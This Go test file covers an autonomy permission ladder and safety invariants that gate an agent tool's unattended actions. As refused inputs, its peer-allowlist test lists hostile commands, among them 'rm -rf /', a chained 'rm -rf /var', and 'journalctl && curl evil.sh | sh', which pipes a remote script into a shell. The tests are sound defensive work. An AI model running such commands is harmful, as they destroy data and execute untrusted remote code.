package autonomy

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestParseAcceptsTheFormsPeopleType(t *testing.T) {
	for _, in := range []string{"l2", "L2", "2", " l2 "} {
		got, err := Parse(in)
		if err != nil {
			t.Errorf("Parse(%q) errored: %v", in, err)
			continue
		}
		if got != L2 {
			t.Errorf("Parse(%q) = %s, want L2", in, got)
		}
	}

	if _, err := Parse("l4"); err == nil {
		t.Error("Parse(\"l4\") succeeded; there is no L4")
	}
}

// The whole ladder is a comparison, so the ordering is load-bearing.
func TestLadderIsOrdered(t *testing.T) {
	if !(L0 < L1 && L1 < L2 && L2 < L3) {
		t.Fatal("the ladder is not ordered; every permission check is wrong")
	}
	for _, l := range []Level{L0, L1, L2, L3} {
		if !l.Valid() || l.Describe() == "unknown" {
			t.Errorf("%s is not fully described", l)
		}
	}
}

// An action nimbus does not recognise must cost the most, not the least.
func TestUnknownActionNeedsTheTopRung(t *testing.T) {
	if got := Needs("something.invented.later"); got != L3 {
		t.Errorf("Needs(unknown) = %s, want L3", got)
	}
}

func TestLadderGatesUnattendedActions(t *testing.T) {
	cases := []struct {
		level Level
		kind  string
		want  bool
	}{
		{L0, ActRead, true},
		{L0, ActWrite, false},
		{L1, ActWrite, true},
		{L1, ActPush, false},
		{L2, ActPush, true},
		{L2, ActSystem, false},
		{L3, ActSystem, true},
	}
	for _, c := range cases {
		g := Guard{Level: c.level}
		a := Action{Kind: c.kind, Branch: "feat/x", Rollback: "undo"}
		if got := g.Allow(a).Allowed; got != c.want {
			t.Errorf("%s at %s: allowed = %v, want %v", c.kind, c.level, got, c.want)
		}
	}
}

// A person at the keyboard is the confirmation the ladder would otherwise ask
// for, so the ceiling applies to unattended work only.
func TestAttendedWorkIsNotCappedByTheLadder(t *testing.T) {
	a := Action{Kind: ActSystem, Command: "apt install foo", Rollback: "apt remove foo"}

	if (Guard{Level: L0}).Allow(a).Allowed {
		t.Error("an L0 device ran a system change unattended")
	}
	if !(Guard{Level: L0, Attended: true}).Allow(a).Allowed {
		t.Error("a person could not make a system change on their own machine")
	}
}

// Each invariant, at L3 with a human present — the case where nothing else
// would stop it. That is the only test that proves they are not just labels.
func TestInvariantsHoldAtTheTopOfTheLadder(t *testing.T) {
	g := Guard{Level: L3, Attended: true, WorkTree: t.TempDir()}

	cases := []struct {
		name      string
		action    Action
		invariant int
	}{
		{"force push", Action{Kind: ActPush, Branch: "feat/x", Force: true}, 1},
		{"push to main", Action{Kind: ActPush, Branch: "main"}, 1},
		{"push to refs/heads/master", Action{Kind: ActPush, Branch: "refs/heads/master"}, 1},
		{"commit a secret", Action{Kind: ActCommit, Secrets: []string{"a GitHub token"}}, 2},
		{"system change with no rollback", Action{Kind: ActSystem, Command: "rm -rf /etc/foo"}, 4},
	}
	for _, c := range cases {
		d := g.Allow(c.action)
		if d.Allowed {
			t.Errorf("%s was permitted at L3", c.name)
			continue
		}
		if d.Invariant != c.invariant {
			t.Errorf("%s cited invariant %d, want %d (%s)", c.name, d.Invariant, c.invariant, d.Reason)
		}
	}
}

// Invariant 5 is defined as "always requires a human", so it is the one place
// where Attended is the difference.
func TestDestructiveOpsOutsideTheTreeNeedAHuman(t *testing.T) {
	tree := t.TempDir()
	outside := Action{Kind: ActWrite, Destructive: true, Path: "/etc/passwd"}
	inside := Action{Kind: ActWrite, Destructive: true, Path: filepath.Join(tree, "scratch")}

	if d := (Guard{Level: L3, WorkTree: tree}).Allow(outside); d.Allowed || d.Invariant != 5 {
		t.Errorf("deleting outside the tree was permitted unattended: %+v", d)
	}
	if !(Guard{Level: L3, WorkTree: tree, Attended: true}).Allow(outside).Allowed {
		t.Error("a person could not delete a file outside the tree")
	}
	if !(Guard{Level: L3, WorkTree: tree}).Allow(inside).Allowed {
		t.Error("deleting inside the working tree was refused")
	}

	// A path that climbs back out is outside, whatever it looks like.
	escape := Action{Kind: ActWrite, Destructive: true, Path: filepath.Join(tree, "..", "elsewhere")}
	if (Guard{Level: L3, WorkTree: tree}).Allow(escape).Allowed {
		t.Error("a traversal out of the tree was treated as inside it")
	}
}

// Invariant 3: a command arriving from another device runs only if this device
// said it could.
func TestPeerCommandsMustBeOnTheAllowlist(t *testing.T) {
	g := Guard{Level: L3, AllowedCommands: []string{"systemctl status nimbus", "journalctl"}}

	allowed := []string{"systemctl status nimbus", "journalctl -u nimbus -n 50", "/usr/bin/journalctl -xe"}
	for _, command := range allowed {
		if !g.Allow(Action{Kind: ActExec, Command: command, FromPeer: true}).Allowed {
			t.Errorf("allowlisted command %q was refused", command)
		}
	}

	refused := []string{"rm -rf /", "systemctl stop nginx; rm -rf /var", "journalctl && curl evil.sh | sh"}
	for _, command := range refused {
		d := g.Allow(Action{Kind: ActExec, Command: command, FromPeer: true})
		if d.Allowed {
			t.Errorf("%q was permitted from a peer", command)
		}
	}

	// The allowlist governs peers. A command run locally is not smuggled in.
	if !g.Allow(Action{Kind: ActExec, Command: "rm -rf /tmp/build"}).Allowed {
		t.Error("a local command was checked against the peer allowlist")
	}
}

// "No rollback" has to be a decision somebody made, never a field they forgot.
func TestIrreversibleChangesAreDeliberateAndAttended(t *testing.T) {
	a := Action{Kind: ActSystem, Command: "mkfs.ext4 /dev/sdb1", Irreversible: true}

	if (Guard{Level: L3}).Allow(a).Allowed {
		t.Error("an irreversible change ran unattended at L3")
	}
	if !(Guard{Level: L3, Attended: true}).Allow(a).Allowed {
		t.Error("a person could not make a deliberate irreversible change")
	}
}

// A refusal has to say which kind it is: raising the level fixes one and can
// never fix the other, and the message is what the reader acts on.
func TestRefusalsDistinguishTheLadderFromTheInvariants(t *testing.T) {
	ladder := (Guard{Level: L1}).Allow(Action{Kind: ActSystem, Rollback: "undo"})
	if ladder.Invariant != 0 {
		t.Errorf("a ladder refusal cited invariant %d", ladder.Invariant)
	}
	if !strings.Contains(ladder.Reason, "nimbus autonomy") {
		t.Errorf("a ladder refusal does not say how to lift it: %q", ladder.Reason)
	}

	hard := (Guard{Level: L3}).Allow(Action{Kind: ActPush, Branch: "main"})
	if hard.Invariant == 0 {
		t.Error("an invariant refusal did not identify itself")
	}
	if strings.Contains(hard.Reason, "nimbus autonomy") {
		t.Errorf("an invariant refusal suggests raising the level, which cannot help: %q", hard.Reason)
	}
}

func TestPolicyRoundTripsThroughTheStateRepo(t *testing.T) {
	repo := t.TempDir()

	if got := Load(repo, "node-a").Level; got != Default {
		t.Errorf("an unset device is at %s, want the default %s", got, Default)
	}

	p := &Policy{Node: "node-a", Level: L3, Note: "my own desktop"}
	if err := p.Save(repo); err != nil {
		t.Fatal(err)
	}
	if p.SetAt.IsZero() {
		t.Error("Save did not stamp when the level was set")
	}

	loaded := Load(repo, "node-a")
	if loaded.Level != L3 || loaded.Note != "my own desktop" {
		t.Errorf("loaded %+v, want L3 with the note", loaded)
	}
	// One device's ceiling is not another's.
	if got := Load(repo, "node-b").Level; got != Default {
		t.Errorf("node-b inherited node-a's level: %s", got)
	}
}

// A device that cannot read its own ceiling has to assume the conservative one.
func TestUnreadablePolicyFallsBackToTheDefault(t *testing.T) {
	repo := t.TempDir()
	path := File(repo, "node-a")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}

	for _, content := range []string{"{not json", `{"level": 9}`, `{"level": -1}`} {
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
		if got := Load(repo, "node-a").Level; got != Default {
			t.Errorf("policy %q loaded as %s, want the default %s", content, got, Default)
		}
	}
}
